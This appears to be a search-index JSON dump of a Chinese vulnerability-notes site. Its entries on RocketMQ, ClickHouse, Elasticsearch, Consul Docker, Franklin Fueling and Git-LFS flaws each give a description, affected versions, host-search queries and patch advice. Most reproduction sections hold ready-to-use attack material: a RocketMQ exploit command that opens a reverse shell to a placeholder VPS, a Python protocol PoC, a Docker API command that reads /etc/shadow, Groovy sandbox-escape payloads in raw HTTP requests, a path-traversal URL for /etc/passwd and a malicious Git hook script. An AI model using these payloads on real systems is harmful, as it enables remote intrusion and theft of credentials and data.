同时针对已不受微软更新支持的系统Windows Server 2003和Windows XP提供的安全更新，下载地址: https://support.microsoft.com/zh-cn/help/4500705/customer-guidance-for-cve-2019-0708 缓解措施（在无法及时安装微软安全更新的情况下作为临时性解决方案） 1.若用户不需要用到远程桌面服务，建议禁用该服务。 2.开启网络级别身份验证（NLA），此方案适用于Windows 7, Windows Server 2008, Windows Server 2008 R2。 以上措施只能暂时性针对该漏洞对系统进行部分缓解，强烈建议在条件允许的情况下及时安装微软安全更新。 ","date":"0001-01-01","objectID":"/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2019-0708/:4:0","tags":null,"title":"","uri":"/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2019-0708/"},{"categories":null,"content":"Apache RocketMQ RCE 漏洞 CVE-2023-33246 ","date":"0001-01-01","objectID":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/:0:0","tags":null,"title":"","uri":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/"},{"categories":null,"content":"漏洞描述 RocketMQ 是阿里巴巴在2012年开发的分布式消息中间件，专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。 RocketMQ 5.1.0 及以下版本，在一定条件下存在远程命令执行风险。RocketMQ 的 NameServer、Broker、Controller 等多个组件暴露在外网且缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以 RocketMQ 运行的系统用户身份执行命令。此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。 ","date":"0001-01-01","objectID":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/:1:0","tags":null,"title":"","uri":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/"},{"categories":null,"content":"漏洞影响 Apache RocketMQ \u003c= 5.1.0 Apache RocketMQ \u003c= 4.9.5 ","date":"0001-01-01","objectID":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/:2:0","tags":null,"title":"","uri":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/"},{"categories":null,"content":"网络测绘 title=\"RocketMQ\" ","date":"0001-01-01","objectID":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/:3:0","tags":null,"title":"","uri":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/"},{"categories":null,"content":"漏洞复现 poc： java -jar CVE-2023-33246.jar -ip \"target-ip\" -cmd \"command\" 反弹 shell： java -jar CVE-2023-33246.jar -ip \"target-ip\" -cmd \"bash -i \u003e\u0026 /dev/tcp/your-vps/9999 0\u003e\u00261\" ","date":"0001-01-01","objectID":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/:4:0","tags":null,"title":"","uri":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/"},{"categories":null,"content":"修复建议 目前官方已发布安全修复更新，受影响用户可以升级到Apache RocketMQ 5.1.1或者4.9.6。 链接：https://rocketmq.apache.org/download/ ","date":"0001-01-01","objectID":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/:5:0","tags":null,"title":"","uri":"/apache-rocketmq-rce-%E6%BC%8F%E6%B4%9E-cve-2023-33246/"},{"categories":null,"content":"Apache RocketMQ 远程代码执行漏洞 CVE-2023-37582 ","date":"0001-01-01","objectID":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/:0:0","tags":null,"title":"","uri":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/"},{"categories":null,"content":"漏洞描述 此漏洞是由于 CVE-2023-33246 补丁未修复完全，当 RocketMQ 的NameServer 组件暴露在外网，且缺乏有效的身份认证时，攻击者可以利用更新配置功能，以 RocketMQ 运行的系统用户身份执行任意命令。 ","date":"0001-01-01","objectID":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/:1:0","tags":null,"title":"","uri":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/"},{"categories":null,"content":"漏洞影响 RocketMQ \u003c 4.9.7 RocketMQ \u003c 5.1.2 ","date":"0001-01-01","objectID":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/:2:0","tags":null,"title":"","uri":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/"},{"categories":null,"content":"网络测绘 title=\"RocketMQ\" ","date":"0001-01-01","objectID":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/:3:0","tags":null,"title":"","uri":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/"},{"categories":null,"content":"漏洞复现 poc： import socket import binascii client = socket.socket() client.settimeout(5) client.connect((target_ip,target_port)) ## make payload json = '{\"code\":318,\"extFields\":{\"test\":\"RockedtMQ\"},\"flag\":0,\"language\":\"JAVA\",\"opaque\":266,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":433}'.encode('utf-8') body=('Thanks DawnT0wn').encode('utf-8') json_lens = int(len(binascii.hexlify(json).decode('utf-8'))/2) head1 = '00000000'+str(hex(json_lens))[2:] all_lens = int(4+len(binascii.hexlify(body).decode('utf-8'))/2+json_lens) head2 = '00000000'+str(hex(all_lens))[2:] data = head2[-8:]+head1[-8:]+binascii.hexlify(json).decode('utf-8')+binascii.hexlify(body).decode('utf-8') ## send client.send(bytes.fromhex(data)) data_recv = client.recv(1024) ","date":"0001-01-01","objectID":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/:4:0","tags":null,"title":"","uri":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/"},{"categories":null,"content":"漏洞修复 目前官方已发布安全版本，建议受影响用户升级至： RocketMQ 5.x \u003e= 5.1.2 RocketMQ 4.x \u003e= 4.9.7 官方补丁下载地址：https://rocketmq.apache.org/download/，同时建议将 NameServer、Broker 等组件部署在内网，并增加权限认证。 ","date":"0001-01-01","objectID":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/:5:0","tags":null,"title":"","uri":"/apache-rocketmq-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-37582/"},{"categories":null,"content":"ClickHouse API 数据库接口未授权访问漏洞 ","date":"0001-01-01","objectID":"/clickhouse-api-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/clickhouse-api-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 ClickHouse API 数据库接口存在未授权访问漏洞，攻击者通过漏洞可以执行任意SQL命令获取数据库数据 ","date":"0001-01-01","objectID":"/clickhouse-api-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/clickhouse-api-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 ClickHouse ","date":"0001-01-01","objectID":"/clickhouse-api-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/clickhouse-api-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"ClickHouse\" \u0026\u0026 body=\"ok\" ","date":"0001-01-01","objectID":"/clickhouse-api-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/clickhouse-api-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 执行SQL语句 http://your-ip:8123/?query=SELECT%20*%20FROM%20system.query_thread_log%20LIMIT%201%20FORMAT%20Vertical 其他的SQL语句： http://your-ip:8123/?query=SHOW%20DATABASES http://your-ip:8123/?query=SELECT%20*%20FROM%20system.tables ","date":"0001-01-01","objectID":"/clickhouse-api-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/clickhouse-api-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Consul Docker images 空密码登录漏洞 CVE-2020-29564 ","date":"0001-01-01","objectID":"/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/:0:0","tags":null,"title":"","uri":"/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/"},{"categories":null,"content":"漏洞描述 Consul Docker images 0.7.1至1.4.2版本部署的Consul Docker容器的系统，可能允许远程攻击者使用空白密码来实现root用户访问。 参考链接： https://github.com/koharin/CVE/blob/main/CVE-2020-29564 ","date":"0001-01-01","objectID":"/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/:1:0","tags":null,"title":"","uri":"/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/"},{"categories":null,"content":"漏洞影响 Consul Docker images 0.7.1-1.4.2 ","date":"0001-01-01","objectID":"/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/:2:0","tags":null,"title":"","uri":"/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/"},{"categories":null,"content":"网络测绘 port=\"2375\" \u0026\u0026 protocol==\"docker\" ","date":"0001-01-01","objectID":"/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/:3:0","tags":null,"title":"","uri":"/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/"},{"categories":null,"content":"漏洞复现 poc： docker -H \u003chost\u003e:2375 run --rm -it --privileged --net=host -v /:/mnt alpine File Access: cat /mnt/etc/shadow RCE: chroot /mnt ","date":"0001-01-01","objectID":"/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/:4:0","tags":null,"title":"","uri":"/consul-docker-images-%E7%A9%BA%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-cve-2020-29564/"},{"categories":null,"content":"ElasticSearch Groovy 沙盒绕过 \u0026 代码执行漏洞 CVE-2015-1427 ","date":"0001-01-01","objectID":"/elasticsearch-groovy-%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-1427/:0:0","tags":null,"title":"","uri":"/elasticsearch-groovy-%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-1427/"},{"categories":null,"content":"漏洞描述 CVE-2014-3120后，ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：1.是一个沙盒绕过； 2.是一个Goovy代码执行漏洞。 参考文章： http://cb.drops.wiki/drops/papers-5107.html http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/ https://github.com/XiphosResearch/exploits http://cb.drops.wiki/drops/papers-5142.html Groovy语言“沙盒” ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法： 既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射 Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言 所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。 Java沙盒绕过法： java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText() Goovy直接执行命令法： def command='id';def res=command.execute().text;res ","date":"0001-01-01","objectID":"/elasticsearch-groovy-%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-1427/:1:0","tags":null,"title":"","uri":"/elasticsearch-groovy-%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-1427/"},{"categories":null,"content":"漏洞复现 jre版本：openjdk:8-jre elasticsearch版本：v1.4.2 由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据： POST /website/blog/ HTTP/1.1 Host: 192.168.44.132:9200 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 25 { \"name\": \"test\" } 然后发送包含payload的数据包，执行任意命令： POST /_search?pretty HTTP/1.1 Host: 192.168.44.132:9200 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/text Content-Length: 156 {\"size\":1, \"script_fields\": {\"lupin\":{\"lang\":\"groovy\",\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}} 结果如图所示： ","date":"0001-01-01","objectID":"/elasticsearch-groovy-%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-1427/:2:0","tags":null,"title":"","uri":"/elasticsearch-groovy-%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-1427/"},{"categories":null,"content":"Elasticsearch 未授权访问 ","date":"0001-01-01","objectID":"/elasticsearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:0:0","tags":null,"title":"","uri":"/elasticsearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"漏洞描述 Elasticsearch是用Java开发的企业级搜索引擎，默认端口9200，存在未授权访问漏洞时，可被非法操作数据 ","date":"0001-01-01","objectID":"/elasticsearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:1:0","tags":null,"title":"","uri":"/elasticsearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"漏洞影响 Elasticsearch ","date":"0001-01-01","objectID":"/elasticsearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:2:0","tags":null,"title":"","uri":"/elasticsearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"漏洞复现 访问目标URL : http://xxx.xxx.xxx.xxx:9200/_node http://localhost:9200/_cat/indices http://localhost:9200/_river/_search //查看数据库敏感信息 http://localhost:9200/_nodes //查看节点数据 http://localhost:9200/_plugin/head/ //web管理界面(head插件) ","date":"0001-01-01","objectID":"/elasticsearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:3:0","tags":null,"title":"","uri":"/elasticsearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"Franklin Fueling Systems tsaupload.cgi 任意文件读取漏洞 CVE-2021-46417 ","date":"0001-01-01","objectID":"/franklin-fueling-systems-tsaupload.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-46417/:0:0","tags":null,"title":"","uri":"/franklin-fueling-systems-tsaupload.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-46417/"},{"categories":null,"content":"漏洞描述 Franklin Electric Franklin Fueling Systems是美国Franklin Electric公司的一个加油系统。 Franklin Fueling Systems tsaupload.cgi 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感文件。 ","date":"0001-01-01","objectID":"/franklin-fueling-systems-tsaupload.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-46417/:1:0","tags":null,"title":"","uri":"/franklin-fueling-systems-tsaupload.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-46417/"},{"categories":null,"content":"漏洞影响 Franklin Fueling Systems ","date":"0001-01-01","objectID":"/franklin-fueling-systems-tsaupload.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-46417/:2:0","tags":null,"title":"","uri":"/franklin-fueling-systems-tsaupload.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-46417/"},{"categories":null,"content":"网络测绘 \"Franklin Fueling Systems\" ","date":"0001-01-01","objectID":"/franklin-fueling-systems-tsaupload.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-46417/:3:0","tags":null,"title":"","uri":"/franklin-fueling-systems-tsaupload.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-46417/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /cgi-bin/tsaupload.cgi?file_name=../../../../../../etc/passwd\u0026password= ","date":"0001-01-01","objectID":"/franklin-fueling-systems-tsaupload.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-46417/:4:0","tags":null,"title":"","uri":"/franklin-fueling-systems-tsaupload.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-46417/"},{"categories":null,"content":"Git for Visual Studio远程执行代码漏洞 CVE-2021-21300 ","date":"0001-01-01","objectID":"/git-for-visual-studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2021-21300/:0:0","tags":null,"title":"","uri":"/git-for-visual-studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2021-21300/"},{"categories":null,"content":"漏洞描述 此漏洞影响具有不区分大小写的文件系统的平台，当某些过滤器被使用时（例如Git LFS）。Git可能会被欺骗运行克隆期间的远程代码。 ","date":"0001-01-01","objectID":"/git-for-visual-studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2021-21300/:1:0","tags":null,"title":"","uri":"/git-for-visual-studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2021-21300/"},{"categories":null,"content":"漏洞影响 v2.17.6 v2.18.5 v2.19.6 v2.20.5 v2.21.4 v2.22.5 v2.23.4 v2.24.4 v2.25.5 v2.26.3 v2.27.1 v2.28.1 v2.29.3 v2.30.2 ","date":"0001-01-01","objectID":"/git-for-visual-studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2021-21300/:2:0","tags":null,"title":"","uri":"/git-for-visual-studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2021-21300/"},{"categories":null,"content":"漏洞复现 参考文章: https://www.openwall.com/lists/oss-security/2021/03/09/3 ","date":"0001-01-01","objectID":"/git-for-visual-studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2021-21300/:3:0","tags":null,"title":"","uri":"/git-for-visual-studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2021-21300/"},{"categories":null,"content":"漏洞POC #!/bin/sh git init delayed-checkout \u0026\u0026 ( cd delayed-checkout \u0026\u0026 echo \"A/post-checkout filter=lfs diff=lfs merge=lfs\" \\ \u003e.gitattributes \u0026\u0026 mkdir A \u0026\u0026 printf '#!/bin/sh\\n\\necho PWNED \u003e\u00262\\n' \u003eA/post-checkout \u0026\u0026 chmod +x A/post-checkout \u0026\u0026 \u003eA/a \u0026\u0026 \u003eA/b \u0026\u0026 git add -A \u0026\u0026 rm -rf A \u0026\u0026 ln -s .git/hooks a \u0026\u0026 git add a \u0026\u0026 git commit -m initial ) \u0026\u0026 git clone delayed-checkout cloned ","date":"0001-01-01","objectID":"/git-for-visual-studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2021-21300/:4:0","tags":null,"title":"","uri":"/git-for-visual-studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2021-21300/"},{"categories":null,"content":"Git-LFS 远程命令执行漏洞 CVE-2020-27955 ","date":"0001-01-01","objectID":"/git-lfs-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-27955/:0:0","tags":null,"title":"","uri":"/git-lfs-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-27955/"},{"categories":null,"content":"漏洞描述 Git LFS 是 Github 开发的一个 Git 的扩展，用于实现 Git 对大文件的支持 一些受影响的产品包括Git，GitHub CLI，GitHub Desktop，Visual Studio，GitKraden，SmartGit，Sourcetree等 该漏洞影响仅windows平台 ","date":"0001-01-01","objectID":"/git-lfs-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-27955/:1:0","tags":null,"title":"","uri":"/git-lfs-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-27955/"},{"categories":null,"content":"漏洞影响 Git-LFS（git-lfs）\u003c= 2.12 ","date":"0001-01-01","objectID":"/git-lfs-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-27955/:2:0","tags":null,"title":"","uri":"/git-lfs-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-27955/"},{"categories":null,"content":"漏洞复现 运行下列的命令，如果版本在影响范围则会弹出计算器 git clone https://github.com/r00t4dm/CVE-2020-27955 ","date":"0001-01-01","objectID":"/git-lfs-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-27955/:3:0","tags":null,"title":"","uri":"/git-lfs-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-27955/"},{"categories":null,"content":"漏洞POC https://github.com/r00t4dm/CVE-2020-27955 ","date":"0001-01-01","objectID":"/git-lfs-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-27955/:4:0","tags":null,"title":"","uri":"/git-lfs-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-27955/"},{"categories":null,"content":"Hashicorp Consul Service API远程命令执行漏洞 ","date":"0001-01-01","objectID":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 2018年11月27日，Consul在官方博客中发布了关于Consul工具在特定配置下可能导致远程命令执行（RCE）漏洞的公告，并描述了防护该漏洞的配置方案。 Consul是HashiCorp公司推出的一款开源工具，用于实现分布式系统的服务发现与配置。与其他分布式服务注册与发现的方案相比，Consul提供的方案更为“一站式”。Consul内置了服务注册与发现框架、分布一致性协议实现、健康检查、Key/Value存储、多数据中心方案，不再需要依赖其他工具（例如ZooKeeper等），使用方式也相对简单。 Consul使用Go语言编写，因此具有天然的可移植性（支持Linux、Windows和Mac OS X系统）；且安装包中仅包含一个可执行文件，便于部署，可与Docker等轻量级容器无缝配合。 在特定配置下，恶意攻击者可以通过发送精心构造的HTTP请求在未经授权的情况下在Consul服务端远程执行命令。 ","date":"0001-01-01","objectID":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/hashicorp-consul-service-api%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 启用了脚本检查参数（-enable-script-checks）的所有版本 